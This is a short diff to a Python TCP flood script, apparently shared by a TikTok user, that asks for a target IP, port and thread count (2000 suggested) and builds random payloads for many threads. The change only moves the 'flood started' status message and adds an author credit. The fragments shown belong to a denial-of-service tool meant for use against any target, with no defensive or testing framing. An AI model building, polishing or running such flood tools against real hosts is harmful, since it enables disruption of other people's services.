@@ -9,7 +9,7 @@ TARGET_IP = input("TARGET IP: ")
 TARGET_PORT = int(input("OPEN PORT: "))
 NUM_THREADS = int(input("THREADS (2000 SUGGESTED): "))
 os.system("clear")
-print("MADE BY apexvr_ ON TIKTOK")
+print(f"🚀 TCP flood started at {TARGET_IP}:{TARGET_PORT} with {NUM_THREADS} threads. Stop with Ctrl+C.\n(MADE BY apexvr_ ON TIKTOK)")
 
 def random_payload(size=1024):
     return ''.join(random.choices(string.ascii_letters + string.digits, k=size)).encode()
@@ -33,7 +33,6 @@ for i in range(NUM_THREADS):
     t.start()
     threads.append(t)
 
-print(f"🚀 TCP flood started at {TARGET_IP}:{TARGET_PORT} with {NUM_THREADS} threads. Stop with Ctrl+C.")
 
 try:
     while True:
